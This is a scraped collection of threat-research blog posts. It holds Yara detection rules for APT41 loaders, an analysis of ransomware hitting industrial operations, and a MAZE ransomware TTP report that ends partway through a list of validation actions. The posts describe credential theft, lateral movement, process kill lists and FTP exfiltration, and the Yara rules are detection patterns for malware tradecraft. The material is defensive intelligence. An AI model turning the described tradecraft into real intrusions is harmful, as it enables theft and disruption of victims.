External Remote Services (T1133), Exploit Public-Facing Application (T1190) Execution PowerShell (T1086), Scripting (T1064) Persistence New Service (T1050) Privilege Escalation Exploitation for Privilege Escalation (T1068) Defense Evasion BITS Jobs (T1197), Process Injection (T1055) Command And Control Remote File Copy (T1105), Commonly Used Port (T1436), Uncommonly Used Port (T1065), Custom Command and Control Protocol (T1094), Data Encoding (T1132), Standard Application Layer Protocol (T1071) Appendix A: Discovery Rules The following Yara rules serve as examples of discovery rules for APT41 actor TTPs, turning the adversary methods or tradecraft into new haystacks for purposes of detection or hunting. For all tradecraft-based discovery rules, we recommend deliberate testing and tuning prior to implementation in any production system. Some of these rules are tailored to build concise haystacks that are easy to review for high-fidelity detections. Some of these rules are broad in aperture that build larger haystacks for further automation or processing in threat hunting systems. import \"pe\" rule ExportEngine_APT41_Loader_String { meta: author = \"@stvemillertime\" description \"This looks for a common APT41 Export DLL name in BEACON shellcode loaders, such as loader_X86_svchost.dll\" strings: $pcre = /loader_[\\x00-\\x7F]{1,}\\x00/ condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12)) } rule ExportEngine_ShortName { meta: author = \"@stvemillertime\" description = \"This looks for Win PEs where Export DLL name is a single character\" strings: $pcre = /[A-Za-z0-9]{1}\\.(dll|exe|dat|bin|sys)/ condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12)) } rule ExportEngine_xArch { meta: author = \"@stvemillertime\" description = \"This looks for Win PEs where Export DLL name is a something like x32.dat\" strings: $pcre = /[\\x00-\\x7F]{1,}x(32|64|86)\\.dat\\x00/ condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $pcre at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12)) } rule RareEquities_LibTomCrypt { meta: author = \"@stvemillertime\" description = \"This looks for executables with strings from LibTomCrypt as seen by some APT41-esque actors https://github.com/libtom/libtomcrypt - might catch everything BEACON as well. You may want to exclude Golang and UPX packed samples.\" strings: $a1 = \"LibTomMath\" condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $a1 } rule RareEquities_KCP { meta: author = \"@stvemillertime\" description = \"This is a wide catchall rule looking for executables with equities for a transport library called KCP, https://github.com/skywind3000/kcp Matches on this rule may have built-in KCP transport ability.\" strings: $a01 = \"[RO] %ld bytes\" $a02 = \"recv sn=%lu\" $a03 = \"[RI] %d bytes\" $a04 = \"input ack: sn=%lu rtt=%ld rto=%ld\" $a05 = \"input psh: sn=%lu ts=%lu\" $a06 = \"input probe\" $a07 = \"input wins: %lu\" $a08 = \"rcv_nxt=%lu\\\\n\" $a09 = \"snd(buf=%d, queue=%d)\\\\n\" $a10 = \"rcv(buf=%d, queue=%d)\\\\n\" $a11 = \"rcvbuf\" condition: (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and filesize < 5MB and 3 of ($a*) } rule ConventionEngine_Term_Users { meta: author = \"@stvemillertime\" description = \"Searching for PE files with PDB path keywords, terms or anomalies.\" sample_md5 = \"09e4e6fa85b802c46bc121fcaecc5666\" ref_blog = \"https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\" strings: $pcre = /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}Users[\\x00-\\xFF]{0,200}\\.pdb\\x00/ nocase ascii condition: (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre } rule ConventionEngine_Term_Desktop { meta: author = \"@stvemillertime\" description = \"Searching for PE files with PDB path keywords, terms or anomalies.\" sample_md5 = \"71cdba3859ca8bd03c1e996a790c04f9\" ref_blog = \"https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\" strings: $pcre = /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}Desktop[\\x00-\\xFF]{0,200}\\.pdb\\x00/ nocase ascii condition: (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre } rule ConventionEngine_Anomaly_MultiPDB_Double { meta: author = \"@stvemillertime\" description = \"Searching for PE files with PDB path keywords, terms or anomalies.\" sample_md5 = \"013f3bde3f1022b6cf3f2e541d19353c\" ref_blog = \"https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html\" strings: $pcre = /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,200}\\.pdb\\x00/ condition: (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and #pcre == 2 } Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-02-24",
                    "source": "www.fireeye.com"
                },
                "text": "Since at least 2017, there has been a significant increase in public disclosures of ransomware incidents impacting industrial production and critical infrastructure organizations. Well-known ransomware families like WannaCry, LockerGoga, MegaCortex, Ryuk, Maze, and now SNAKEHOSE (a.k.a. Snake / Ekans), have cost victims across a variety of industry verticals many millions of dollars in ransom and collateral costs. These incidents have also resulted in significant disruptions and delays to the physical processes that enable organizations to produce and deliver goods and services. While lots of information has been shared about the victims and immediate impacts of industrial sector ransomware distribution operations, the public discourse continues to miss the big picture. As financial crime actors have evolved their tactics from opportunistic to post-compromise ransomware deployment, we have observed an increase in adversaries’ internal reconnaissance that enables them to target systems that are vital to support the chain of production. As a result, ransomware infections—either affecting critical assets in corporate networks or reaching computers in OT networks—often result in the same outcome: insufficient or late supply of end products or services. Truly understanding the unique nuances of industrial sector ransomware distribution operations requires a combination of skillsets and visibility across both IT and OT systems. Using examples derived from our consulting engagements and threat research, we will explain how the shift to post-compromise ransomware operations is fueling adversaries’ ability to disrupt industrial operations. Industrial Sector Ransomware Distribution Poses Increasing Risk as Actors Move to Post-Compromise Deployment The traditional approach to ransomware attacks predominantly relies on a “shotgun” methodology that consists of indiscriminate campaigns spreading malware to encrypt files and data from a variety of victims. Actors following this model will extort victims for an average of $500 to $1,000 USD and hope to receive payments from as many individuals as possible. While early ransomware campaigns adopting this approach were often considered out of scope for OT security, recent campaigns targeting entire industrial and critical infrastructure organizations have moved toward adopting a more operationally complex post-compromise approach. In post-compromise ransomware incidents, a threat actor may still often rely on broadly distributed malware to obtain their initial access to a victim environment, but once on a network they will focus on gaining privileged access so they can explore the target networks and identify critical systems before deploying the ransomware. This approach also makes it possible for the attacker to disable security processes that would normally be enough to detect known ransomware indicators or behaviors. Actors cast wider nets that may impact critical systems, which  expand the scale and effectiveness of their end-stage operations by inflicting maximum pain on the victim. As a result, they are better positioned to negotiate and can often demand much higher ransoms—which are commonly commensurate with the victims’ perceived ability to pay and the value of the ransomed assets themselves. For more information, including technical detail, on similar activity, see our recent blog posts on FIN6 and TEMP.MixMaster . Figure 1: Comparison of indiscriminate vs. post-compromise ransomware approaches Historical incidents involving the opportunistic deployment of ransomware have often been limited to impacting individual computers, which occasionally included OT intermediary systems that were either internet-accessible, poorly segmented, or exposed to infected portable media. In 2017, we also observed campaigns such as NotPetya and BadRabbit, where wiper malware with worm-like capabilities were released to disrupt organizations while masquerading as ransomware. While these types of campaigns pose a threat to industrial production, the adoption of post-compromise deployment presents three major twists in the plot. As threat actors tailor their attacks to target specific industries or organizations, companies with high-availability requirements (e.g., public utilities, hospitals, and industrial manufacturing) and perceived abilities to pay ransoms (e.g., higher revenue companies) become prime targets. This represents an expansion of financial crime actors’ targeting of industries that process directly marketable information (e.g., credit card numbers or customer data) to include the monetization of production environments. As threat actors perform internal reconnaissance and move laterally across target networks before deploying ransomware, they are now better positioned to cast wide nets that impact the target’s most critical assets and negotiate from a privileged position. Most importantly, many of the tactics, techniques, and procedures (TTPs) often used by financial actors in the past, resemble those employed by high-skilled actors across the initial and middle stages of the attack lifecycle of past OT security incidents. Therefore, financial crime actors are likely capable of pivoting to and deploying ransomware in OT intermediary systems to further disrupt operations. Organized Financial Crime Actors Have Demonstrated an Ability to Disrupt OT Assets An actor’s capability to obtain financial benefits from post-compromise ransomware deployment depends on many factors, one of which is the ability to disrupt systems that are the most relevant to the core mission of the victim organizations. As a result, we can expect mature actors to gradually broaden their selection from only IT and business processes, to also OT assets monitoring and controlling physical processes. This is apparent in ransomware families such as SNAKEHOSE, which was designed to execute its payload only after stopping a series of processes that included some industrial software from vendors such as General Electric and Honeywell. At first glance, the SNAKEHOSE kill list appeared to be specifically tailored to OT environments due to the relatively small number of processes (yet high number of OT-related processes) identified with automated tools for initial triage. However, after manually extracting the list from the function that was terminating the processes, we determined that the kill list utilized by SNAKEHOSE actually targets over 1,000 processes. In fact, we have observed very similar process kill lists deployed alongside samples from other ransomware families, including LockerGoga, MegaCortex, and Maze. Not surprisingly, all of these code families have been associated with high-profile incidents impacting industrial organizations for the past two years. The earliest kill list containing OT processes we identified was a batch script deployed alongside LockerGoga in January 2019. The list is very similar to those used later in MegaCortex incidents, albeit with notable exceptions, such as an apparent typo on an OT-related process that is not present in our SNAKEHOSE or MegaCortex samples: “proficyclient.exe4”. The absence of this typo in the SNAKEHOSE and MegaCortex samples could indicate that one of these malware authors identified and corrected the error when initially copying the OT-processes from the LockerGoga list, or that the LockerGoga author failed to properly incorporate the processes from some theoretical common source of origin, such as a dark web post. Figure 2: ‘proficyclient.exe’ spelling in kill lists deployed with LockerGoga (left) and SNAKEHOSE (right) Regardless of which ransomware family first employed the OT-related processes in a kill list or where the malware authors acquired the list, the seeming ubiquity of this list across malware families suggests that the list itself is more noteworthy than any individual malware family that has implemented it. While the OT processes identified in these lists may simply represent the coincidental output of automated process collection from target environments and not a targeted effort to impact OT, the existence of this list provides financial crime actors opportunities to disrupt OT systems. Furthermore, we expect that as financially motivated threat actors continue to impact industrial sector organizations, become more familiar with OT, and identify dependencies across IT and OT systems, they will develop capabilities—and potentially intent—to disrupt other systems and environments running industrial software products and technology. Ransomware Deployments in Both IT and OT Systems Have Impacted Industrial Production As a result of adversaries’ post-compromise strategy and increased awareness of industrial sector targets, ransomware incidents have effectively impacted industrial production regardless of whether the malware was deployed in IT or OT. Ransomware incidents encrypting data from servers and computers in corporate networks have resulted in direct or indirect disruptions to physical production processes overseen by OT networks. This has caused insufficient or late supply of end products or services, representing long-term financial losses in the form of missed business opportunities, costs for incident response, regulatory fines, reputational damage, and sometimes even paid ransoms. In certain sectors, such as utilities and public services, high availability is also critical to societal well-being. The best-known example of ransomware impacting industrial production due to an IT network infection is Norsk Hydro’s incident from March 2019, where disruptions to Business Process Management Systems (BPMS) forced multiple sites to shut down automation operations. Among other collateral damage, the ransomware interrupted communication between IT systems that are commonly used to manage resources across the production chain. Interruptions to these flows of information containing for example product inventories, forced employees to identify manual alternatives to handle more than 6,500 stock-keeping units and 4,000 shelves. FireEye Mandiant has responded to at least one similar case where TrickBot was used to deploy Ryuk ransomware at an oil rig manufacturer. While the infection happened only on corporate networks, the biggest business impact was caused by disruptions of Oracle ERP software driving the company temporarily offline and negatively affecting production. Ransomware may result in similar outcomes when it reaches IT-based assets in OT networks, for example human-machine interfaces (HMIs), supervisory control and data acquisition (SCADA) software, and engineering workstations. Most of this equipment relies on commodity software and standard operating systems that are vulnerable to a variety of IT threats. Mandiant Intelligence is aware of at least one incident in which an industrial facility suffered a plant shutdown due to a large-scale ransomware attack, based on sensitive sources. The facility's network was improperly segmented, which allowed the malware to propagate from the corporate network into the OT network, where it encrypted servers, HMIs, workstations, and backups. The facility had to reach out to multiple vendors to retrieve backups, many of which were decades old, which delayed complete restoration of production. As recently as February 2020, the Cybersecurity Infrastructure and Security Agency (CISA) released Alert AA20-049A describing how a post-compromise ransomware incident had affected control and communication assets on the OT network of a natural gas compression facility. Impacts to HMIs, data historians, and polling servers resulted in loss of availability and loss of view for human operators. This prompted an intentional shut down of operations that lasted two days. Mitigating the Effects of Ransomware Requires Defenses Across IT and OT Threat actors deploying ransomware have made rapid advances both in terms of effectiveness and as a criminal business model, imposing high operational costs on victims. We encourage all organizations to evaluate their safety and industrial risks related to ransomware attacks. Note that these recommendations will also help to build resilience in the face of other threats to business operations (e.g., cryptomining malware infections). While every case will differ, we highlight the following recommendations. For custom services and actionable intelligence in both IT and OT, contact FireEye Mandiant Consulting , Managed Defense , and Threat Intelligence . Conduct tabletop and/or controlled red team exercises to assess the current security posture and ability of your organization to respond to the ransomware threat. Simulate attack scenarios (mainly in non-production environments) to understand how the incident response team can (or cannot) detect, analyze, and recover from such an attack. Revisit recovery requirements based on the exercise results. In general, repeatedly practicing various threat scenarios will improve awareness and ability to respond to real incidents. Review operations, business processes, and workflows to identify assets that are critical to maintaining continuous industrial operations. Whenever possible, introduce redundancy for critical assets with low tolerance to downtime. The right amount and type of redundancy is unique for each organization and can be determined through risk assessments and cost-benefit analyses. Note that such analyses cannot be conducted without involving business process owners and collaborating across IT and OT. Logically segregate primary and redundant assets either by a network-based or host-based firewall with subsequent asset hardening (e.g., disabling services typically used by ransomware for its propagation, like SMB, RDP, and WMI). In addition to creating policies to disable unnecessary peer-to-peer and remote connections, we recommend routine auditing of all systems that potentially host these services and protocols. Note that such architecture is generally more resilient to security incidents. When establishing a rigorous back-up program, special attention should be paid to ensuring the security (integrity) of backups. Critical backups must be kept offline or, at minimum, on a segregated network. Optimize recovery plans in terms of recovery time objective. Introduce required alternative workflows (including manual) for the duration of recovery. This is especially critical for organizations with limited or no redundancy of critical assets. When recovering from backups, harden recovered assets and the entire organization's infrastructure to prevent recurring ransomware infection and propagation. Establish clear ownership and management of OT perimeter protection devices to ensure emergency, enterprise-wide changes are possible. Effective network segmentation must be maintained during containment and active intrusions. Hunt for adversary intrusion activity in intermediary systems , which we define as the networked workstations and servers using standard operating systems and protocols. While the systems are further away from direct control of physical processes, there is a much higher likelihood of attacker presence. Note, that every organization is different, with unique internal architectures and processes, stakeholder needs, and customer expectations. Therefore, all recommendations should be carefully considered in the context of the individual infrastructures. For instance, proper network segmentation is highly advisable for mitigating the spread of ransomware. However, organizations with limited budgets may instead decide to leverage redundant asset diversification, host-based firewalls, and hardening as an alternative to segregating with hardware firewalls. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-05-07",
                    "source": "www.fireeye.com"
                },
                "text": "Targeted ransomware incidents have brought a threat of disruptive and destructive attacks to organizations across industries and geographies. FireEye Mandiant Threat Intelligence has previously documented this threat in our investigations of trends across ransomware incidents , FIN6 activity , implications for OT networks , and other aspects of post-compromise ransomware deployment. Since November 2019, we’ve seen the MAZE ransomware being used in attacks that combine targeted ransomware use, public exposure of victim data, and an affiliate model. Malicious actors have been actively deploying MAZE ransomware since at least May 2019. The ransomware was initially distributed via spam emails and exploit kits before later shifting to being deployed post-compromise. Multiple actors are involved in MAZE ransomware operations, based on our observations of alleged users in underground forums and distinct tactics, techniques, and procedures across Mandiant incident response engagements. Actors behind MAZE also maintain a public-facing website where they post data stolen from victims who refuse to pay an extortion fee. The combination of these two damaging intrusion outcomes—dumping sensitive data and disrupting enterprise networks—with a criminal service makes MAZE a notable threat to many organizations. This blog post is based on information derived from numerous Mandiant incident response engagements and our own research into the MAZE ecosystem and operations. Mandiant Threat Intelligence will be available to answer questions on the MAZE ransomware threat in a May 21 webinar . Victimology We are aware of more than 100 alleged MAZE victims reported by various media outlets and on the MAZE website since November 2019. These organizations have been primarily based in North America, although victims spanned nearly every geographical region. Nearly every industry sector including manufacturing, legal, financial services, construction, healthcare, technology, retail, and government has been impacted demonstrating that indiscriminate nature of these operations (Figure 1). Figure 1: Geographical and industry distribution of alleged MAZE victims Multiple Actors Involved in MAZE Ransomware Operations Identified Mandiant identified multiple Russian-speaking actors who claimed to use MAZE ransomware and were seeking partners to fulfill different functional roles within their teams. Additional information on these actors is available to Mandiant Intelligence subscribers . A panel used to manage victims targeted for MAZE ransomware deployment has a section for affiliate transactions. This activity is consistent with our assessment that MAZE operates under an affiliate model and is not distributed by a single group. Under this business model, ransomware developers will partner with other actors (i.e. affiliates) who are responsible for distributing the malware. In these scenarios, when a victim pays the ransom demand, the ransomware developers receive a commission. Direct affiliates of MAZE ransomware also partner with other actors who perform specific tasks for a percentage of the ransom payment. This includes partners who provide initial access to organizations and pentesters who are responsible for reconnaissance, privilege escalation and lateral movement—each of which who appear to work on a percentage-basis. Notably, in some cases, actors may be hired on a salary basis (vs commission) to perform specific tasks such as determining the victim organization and its annual revenues. This allows for specialization within the cyber criminal ecosystem, ultimately increasing efficiency, while still allowing all parties involved to profit. Figure 2: MAZE ransomware panel MAZE Initially Distributed via Exploit Kits and Spam Campaigns MAZE ransomware was initially distributed directly via exploit kits and spam campaigns through late 2019. For example, in November 2019, Mandiant observed multiple email campaigns delivering Maze ransomware primarily to individuals at organizations in Germany and the United States, although a significant number of emails were also delivered to entities in Canada, Italy, and South Korea. These emails used tax, invoice, and package delivery themes with document attachments or inline links to documents which download and execute Maze ransomware. On November 6 and 7, a Maze campaign targeting Germany delivered macro-laden documents using the subject lines “Wichtige informationen uber Steuerruckerstattung” and “1&1 Internet AG - Ihre Rechnung 19340003422 vom 07.11.19” (Figure 3). Recipients included individuals at organizations in a wide range of industries, with the Financial Services, Healthcare, and Manufacturing sectors being targeted most frequently. These emails were sent using a number of malicious domains created with the registrant address gladkoff1991@yandex.ru. Figure 3: German-language lure On November 8, a campaign delivered Maze primarily to Financial Services and Insurance organizations located in the United states. These emails originated from a compromised or spoofed account and contained an inline link to download a Maze executable payload. On November 18 and 19, a Maze campaign targeted individuals operating in a range of industries in the United States and Canada with macro documents using phone bill and package delivery themes (Figure 4 and Figure 5). These emails used the subjects “Missed package delivery” and \"Your AT&T wireless bill is ready to view\" and were sent using a number of malicious domains with the registrant address abusereceive@hitler.rocks. Notably, this registrant address was also used to create multiple Italian-language domains towards the end of November 2019. Figure 4: AT&T email lure Figure 5: Canada Post email lure Shift to Post-Compromise Distribution Maximizes Impact Actors using MAZE have increasingly shifted to deploying the ransomware post-compromise. This methodology provides an opportunity to infect more hosts within a victim’s environment and exfiltrate data, which is leveraged to apply additional pressure on organizations to pay extortion fees. Notably, in at least some cases, the actors behind these operations charge an additional fee, in addition to the decryption key, for the non-release of stolen data. Although the high-level intrusion scenarios preceding the distribution of MAZE ransomware are broadly similar, there have been notable variations across intrusions that suggest attribution to distinct teams. Even within these teams, the cyber criminals appear to be task-oriented meaning that one operator is not responsible for the full lifecycle. The following sections highlight the TTPs seen in a subset of incidents and serve to illustrate the divergence that may occur due to the fact that numerous, disparate actors are involved in different phases of these operations. Notably, the time between initial compromise to encryption has also been widely varied, from weeks to many months. Initial Compromise There are few clear patterns for intrusion vector across analyzed MAZE ransomware incidents. This is consistent with our observations of multiple actors who use MAZE soliciting partners with network access. The following are a sample of observations from several Mandiant incident response engagements: A user downloaded a malicious resume-themed Microsoft Word document that contained macros which launched an IcedID payload, which was ultimately used to execute an instance of BEACON. An actor logged into an internet-facing system via RDP. The account used to grant initial access was a generic support account. It is unclear how the actor obtained the account's password. An actor exploited a misconfiguration on an Internet-facing system. This access enabled the actor to deploy tools to pivot into the internal network. An actor logged into a Citrix web portal account with a weak password. This authenticated access enabled the actor to launch a Meterpreter payload on an internal system. Establish Foothold & Maintain Presence The use of legitimate credentials and broad distribution of BEACON across victim environments appear to be consistent approaches used by actors to establish their foothold in victim networks and to maintain presence as they look to meet their ultimate objective of deploying MAZE ransomware. Despite these commonplace behaviors, we have observed an actor create their own domain account to enable latter-stage operations. Across multiple incidents, threat actors deploying MAZE established a foothold in victim environments by installing BEACON payloads on many servers and workstations. Web shells were deployed to an internet-facing system. The system level access granted by these web shells was used to enable initial privilege escalation and the execution of a backdoor. Intrusion operators regularly obtained and maintained access to multiple domain and local system accounts with varying permissions that were used throughout their operations. An actor created a new domain account and added it to the domain administrators group. Escalate Privileges Although Mandiant has observed multiple cases where MAZE intrusion operators employed Mimikatz to collect credentials to enable privilege escalation, these efforts have also been bolstered in multiple cases via use of Bloodhound, and more manual searches for files containing credentials. Less than two weeks after initial access, the actor downloaded and interacted with an archive named mimi.zip , which contained files corresponding to the credential harvesting tool Mimikatz. In the following days the same mimi.zip archive was identified on two domain controllers in the impacted environment. The actor attempted to find files with the word “password” within the environment. Additionally, several archive files were also created with file names suggestive of credential harvesting activity. The actor attempted to identify hosts running the KeePass password safe software. Across multiple incidents, the Bloodhound utility was used, presumably to assess possible methods of obtaining credentials with domain administrator privileges. Actors primarily used Procdump and Mimikatz to collect credentials used to enable later stages of their intrusion. Notably, both Bloodhound and PingCastle were also used, presumably to enable attackers' efforts to understand the impacted organization's Active Directory configuration. In this case the responsible actors also attempted to exfiltrate collected credentials to multiple different cloud file storage services. Reconnaissance Mandiant has observed a broad range of approaches to network, host, data, and Active Directory reconnaissance across observed MAZE incidents. The varied tools and approaches across these incidents maybe best highlights the divergent ways in which the responsible actors interact with victim networks. In some intrusions, reconnaissance activity occurred within three days of gaining initial access to the victim network. The responsible actor executed a large number of reconnaissance scripts via Cobalt Strike to collect network, host, filesystem, and domain related information. Multiple built-in Windows commands were used to enable network, account, and host reconnaissance of the impacted environment, though the actors also supplied and used Advanced IP Scanner and Adfind to support this stage of their operations. Preliminary network reconnaissance has been conducted using a batch script named '2.bat' which contained a series of nslookup commands. The output of this script was copied into a file named '2.txt'. The actor exfiltrated reconnaissance command output data and documents related to the IT environment to an attacker-controlled FTP server via an encoded PowerShell script. Over a period of several days, an actor conducted reconnaissance activity using Bloodhound, PowerSploit/PowerView (Invoke-ShareFinder), and a reconnaissance script designed to enumerate directories across internal hosts. An actor employed the adfind tool and a batch script to collect information about their network, hosts, domain, and users. The output from this batch script (2adfind.bat) was saved into an archive named 'ad.7z' using an instance of the 7zip archiving utility named 7.exe . An actor used the tool smbtools.exe to assess whether accounts could login to systems across the environment. An actor collected directory listings from file servers across an impacted environment. Evidence of data exfiltration was observed approximately one month later, suggesting that the creation of these directory listings may have been precursor activity, providing the actors with data they may have used to identify sensitive data for future exfiltration. Lateral Movement Across the majority of MAZE ransomware incidents lateral movement was accomplished via Cobalt Strike BEACON and using previously harvested credentials. Despite this uniformity, some alternative tools and approaches were also observed. Attackers relied heavily on Cobalt Strike BEACON to move laterally across the impacted environment, though they also tunneled RDP using the ngrok utility, and employed tscon to hijack legitimate rdp sessions to enable both lateral movement and privilege escalation. The actor moved laterally throughout some networks leveraging compromised service and user accounts obtained from the system on which they gained their initial foothold. This allowed them to obtain immediate access to additional systems. Stolen credentials were then used to move laterally across the network via RDP and to install BEACON payloads providing the actors with access to nearly one hundred hosts. An actor moved laterally using Metasploit and later deployed a Cobalt Strike payload to a system using a local administrator account. At least one actor attempted to perform lateral movement using EternalBlue in early and late 2019; however, there is no evidence that these attempts were successful. Complete Mission There was evidence suggesting data exfiltration across most analyzed MAZE ransomware incidents. While malicious actors could monetize stolen data in various way (e.g. sale in an underground forum, fraud), actors employing MAZE are known to threaten the release of stolen data if victim organizations do not pay an extortion fee. An actor has been observed exfiltrating data to FTP servers using a base64-encoded PowerShell script designed to upload any files with .7z file extensions to a predefined FTP server using a hard-coded username and password. This script appears to be a slight variant of a script first posted to Microsoft TechNet in 2013. A different base64-encoded PowerShell command was also used to enable this functionality in a separate incident. Actors deploying MAZE ransomware have also used the utility WinSCP to exfiltrate data to an attacker-controlled FTP server. An actor has been observed employing a file replication utility and copying the stolen data to a cloud file hosting/sharing service. Prior to deploying MAZE ransomware threat actors employed the 7zip utility to archive data from across various corporate file shares. These archives were then exfiltrated to an attacker-controlled server via FTP using the WinSCP utility. In addition to data theft, actors deploy MAZE ransomware to encrypt files identified on the victim network. Notably, the aforementioned MAZE panel has an option to specify the date on which ransom demands will double, likely to create a sense of urgency to their demands. Five days after data was exfiltrated from a victim environment the actor copied a MAZE ransomware binary to 15 hosts within the victim environment and successfully executed it on a portion of these systems. Attackers employed batch scripts and a series to txt files containing host names to distribute and execute MAZE ransomware on many servers and workstations across the victim environment. An actor deployed MAZE ransomware to tens of hosts, explicitly logging into each system using a domain administrator account created earlier in the intrusion. Immediately following the exfiltration of sensitive data, the actors began deployment of MAZE ransomware to hosts across the network. In some cases, thousands of hosts were ultimately encrypted. The encryption process proceeded as follows: A batch script named start.bat was used to execute a series of secondary batch scripts with names such as xaa3x.bat or xab3x.bat . Each of these batch scripts contained a series of commands that employed the copy command, WMIC, and PsExec to copy and execute a kill script (windows.bat) and an instance of MAZE ransomware (sss.exe) on hosts across the impacted environment Notably, forensic analysis of the impacted environment revealed MAZE deployment scripts targeting ten times as many hosts as were ultimately encrypted. Implications Based on our belief that the MAZE ransomware is distributed by multiple actors, we anticipate that the TTPs used throughout incidents associated with this ransomware will continue to vary somewhat, particularly in terms of the initial intrusion vector. For more comprehensive recommendations for addressing ransomware, please refer to our Ransomware Protection and Containment Strategies blog post and the linked white paper . Mandiant Security Validation Actions Organizations can validate their security controls against more than 20 MAZE-specific actions with Mandiant Security Validation . Please see our Headline Release Content Updates – April 21, 2020 on the Mandiant Security Validation Customer Portal for more information. A100-877 - Active Directory - BloodHound, CollectionMethod All A150-006 - Command and Control - BEACON, Check-in A101-030 - Command and Control - MAZE Ransomware, C2 Beacon, Variant #1 A101-031 - Command and Control - MAZE Ransomware, C2 Beacon, Variant #2 A101-032 - Command and Control - MAZE Ransomware, C2 Beacon, Variant #3 A100-878 - Command and Control - MAZE Ransomware, C2 Check-in A100-887 - Command and Control - MAZE, DNS Query #1 A100-888 - Command and Control - MAZE, DNS Query #2 A100-889 - Command and Control - MAZE, DNS Query #3 A100-890 -  Command and Control - MAZE, DNS Query #4 A100-891 - Command and Control - MAZE, DNS Query #5 A100-509 - Exploit Kit Activity - Fallout Exploit Kit CVE-2018-8174, Github PoC A100-339 - Exploit Kit Activity - Fallout Exploit Kit CVE-2018-8174, Landing Page A101-033 - Exploit Kit Activity - Spelevo Exploit Kit, MAZE C2 A100-208 - FTP-based Exfil/Upload of PII Data (Various Compression) A104-488 - Host CLI - Collection, Exfiltration: Active Directory Reconnaissance with SharpHound, CollectionMethod All A104-046 - Host CLI - Collection, Exfiltration: Data from Local Drive using PowerShell A104-090 - Host CLI - Collection, Impact: Creation of a Volume Shadow Copy A104-489 - Host CLI - Collection: Privilege Escalation Check with PowerUp, Invoke-AllChecks A104-037 - Host CLI - Credential Access, Discovery: File & Directory Discovery A104-052 - Host CLI - Credential Access: Mimikatz A104-167 - Host CLI - Credential Access: Mimikatz (2.1.1) A104-490 - Host CLI - Defense Evasion, Discovery: Terminate Processes, Malware Analysis Tools A104-491 - Host CLI - Defense Evasion, Persistence: MAZE, Create Target.lnk A104-500 - Host CLI - Discovery, Defense Evasion: Debugger Detection A104-492 - Host CLI - Discovery, Execution: Antivirus Query with WMI, PowerShell A104-374 - Host CLI - Discovery: Enumerate Active Directory Forests A104-493 - Host CLI - Discovery: Enumerate Network Shares A104-481 - Host CLI - Discovery: Language Query Using PowerShell, Current User A104-482 - Host CLI - Discovery: Language Query Using reg query A104-494 - Host CLI - Discovery: MAZE, Dropping Ransomware Note Burn Directory A104-495 - Host CLI - Discovery: MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.html Variant A104-496 - Host CLI - Discovery: MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.txt Variant A104-027 - Host CLI - Discovery: Process Discovery A104-028 - Host CLI - Discovery: Process Discovery with PowerShell A104-029 - Host CLI - Discovery: Remote System Discovery A104-153 - Host CLI - Discovery: Security Software Identification with Tasklist A104-083 - Host CLI - Discovery: System Info A104-483 - Host CLI - Exfiltration: PowerShell FTP Upload A104-498 - Host CLI - Impact: MAZE, Desktop Wallpaper Ransomware Message A104-227 - Host CLI - Initial Access, Lateral Movement: Replication Through Removable Media A100-879 - Malicious File Transfer - Adfind.exe, Download A150-046 - Malicious File Transfer - BEACON, Download A100-880 - Malicious File Transfer - Bloodhound Ingestor Download, C Sharp Executable Variant A100-881 - Malicious File Transfer - Bloodhound Ingestor Download, C Sharp PowerShell Variant A100-882 - Malicious File Transfer - Bloodhound Ingestor Download, PowerShell Variant A101-037 - Malicious File Transfer - MAZE Download, Variant #1 A101-038 - Malicious File Transfer - MAZE Download, Variant #2 A101-039 - Malicious File Transfer - MAZE Download, Variant #3 A101-040 - Malicious File Transfer - MAZE Download, Variant #4 A101-041 - Malicious File Transfer - MAZE Download, Variant #5 A101-042 - Malicious File Transfer - MAZE Download, Variant #6 A101-043 - Malicious File Transfer - MAZE Download, Variant #7 A101-044 - Malicious File Transfer - MAZE Download, Variant #8 A101-045 - Malicious File Transfer - MAZE Download, Variant #9 A101-034 - Malicious File Transfer - MAZE Dropper Download, Variant #1 A101-035 - Malicious File Transfer - MAZE Dropper Download, Variant #2 A100-885 - Malicious File Transfer - MAZE Dropper Download, Variant #4 A101-036 - Malicious File Transfer - MAZE Ransomware, Malicious Macro, PowerShell Script Download A100-284 - Malicious File Transfer - Mimikatz W/ Padding (1MB), Download A100-886 - Malicious File Transfer - Rclone.exe, Download A100-484 - Scanning Activity 